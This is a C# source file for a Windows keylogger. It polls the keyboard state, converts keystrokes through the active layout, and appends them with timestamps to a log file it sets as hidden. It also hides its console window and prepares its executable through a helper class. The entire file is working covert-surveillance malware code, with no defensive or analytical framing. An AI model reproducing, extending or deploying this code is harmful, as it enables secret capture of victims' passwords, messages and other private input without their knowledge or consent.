using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace keylog.core
{
    class KeyLog
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        [DllImport("user32.dll")]
        static extern uint MapVirtualKeyEx(uint uCode, uint uMapType, IntPtr dwhkl);
        [DllImport("user32.dll")]
        public static extern IntPtr GetKeyboardState(byte[] lpKeyState);
        [DllImport("user32.dll")]
        public static extern IntPtr GetForegroundWindow();
        [DllImport("user32.dll", SetLastError = true)]
        static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
        [DllImport("user32.dll", SetLastError = true)]
        static extern uint GetKeyboardLayout(uint idThread);
        [DllImport("user32.dll", SetLastError = true)]
        static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)]
        StringBuilder pwszBuff, int cchBuff, uint wFlags, uint dwhkl);

        private string logPath;
        private int captureTime;
        private Boolean debug = true;
        private Boolean isFirstLine = true;
        private TextWriter textWriter;
        private Helper helper;
        
        public KeyLog(int captureTime, Boolean debug, String logPath)
        {
            helper = new Helper();
            helper.MakeFolderStructure(Path.GetDirectoryName(logPath));
            helper.PrepareExecutable();
            this.debug = debug;
            this.logPath = logPath;
            this.captureTime = captureTime;
            if (!this.debug) helper.HideConsole(); this.debug = false;
        }

        /**
         * Start logging all the keys of the keyboard
         * Save the log file every key pressed */
        public void StartLog()
        {
            Keys lastKey = 0;
            while (true)
            {
                Boolean shiftKey;
                Boolean capsLock;
                String text = "";
                Thread.Sleep(captureTime);
                for (int i = 0; i < 1000; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState == 1 || keyState == -32767)
                    {
                        shiftKey = Convert.ToBoolean(GetAsyncKeyState((int)Keys.ShiftKey));
                        capsLock = Convert.ToBoolean(GetAsyncKeyState((int)Keys.CapsLock));
                        text = ProcessKey((Keys)i, shiftKey, capsLock);
                        if (CheckNewLine(lastKey, (Keys)i))
                        {
                            SaveLog(text);
                        }
                        lastKey = (Keys)i;
                    }
                }
            }
        }

        /**
         * Process a key depending of here type
         * @param shiftKey: ShiftKey enabled?
         * @param capsLock: Capslock enabled?
         * @return: the text corresponding to the key
         */
        private String ProcessKey(Keys key, Boolean shiftKey, Boolean capsLock)
        {
            String text = "";
            switch(key)
            {
                case Keys.Back:
                case Keys.ShiftKey:
                    text = "["+key.ToString()+"]";
                    break;
                case Keys.Enter:
                    text = Environment.NewLine;
                    break;
                case Keys.Space:
                    text = " ";
                    break;
                case Keys.Tab:
                    text = "\t";
                    break;
                default:
                    IntPtr windowHandle = GetForegroundWindow();
                    uint processId;
                    uint threadId = GetWindowThreadProcessId(windowHandle, out processId);
                    byte[] kState = new byte[256];
                    GetKeyboardState(kState);
                    uint layout = GetKeyboardLayout(threadId);
                    StringBuilder keyName = new StringBuilder();
                    ToUnicodeEx((uint)key, (uint)key, kState, keyName, 16, 0, layout);
                    text = keyName.ToString();
                    if((int)key >=65 && (int)key <= 90)
                    {
                        text = (!shiftKey && capsLock || shiftKey && !capsLock ? Convert.ToChar(key).ToString()
                        : Convert.ToChar(key).ToString().ToLower());
                    }
                    break;
            }
            return text;
        }

        /**
         * Check if a new line can be added
         * @param lastKey: the last key introduced
         * @param key: the actual key
         * @return: a new line can be added? */
        private Boolean CheckNewLine(Keys lastKey, Keys key)
        {
            return (lastKey != Keys.Enter || key != Keys.Enter) ? true : false;
        }

        /**
        * Save the log file with a stablished text
        * @param text: the text to save
        */
        private void SaveLog(string text)
        {
            textWriter = new StreamWriter(logPath, true);
            File.SetAttributes(logPath, FileAttributes.Hidden);

            if (text == Environment.NewLine)
            {
                text = text + MakeLineHeader();
            }else if (isFirstLine)
            {
                text = MakeLineHeader() + text;
                isFirstLine = false;
            } 
            textWriter.Write(text);
            textWriter.Close();
        }

        /**
         * Make a header for the line 
         * @return: a line with a header */
        private String MakeLineHeader()
        {
           return DateTime.Now.ToString("dd/MM/yy HH:mm:ss" + " ");
        }

        public String GetLogPath()
        {
            return logPath;
        }
    }
}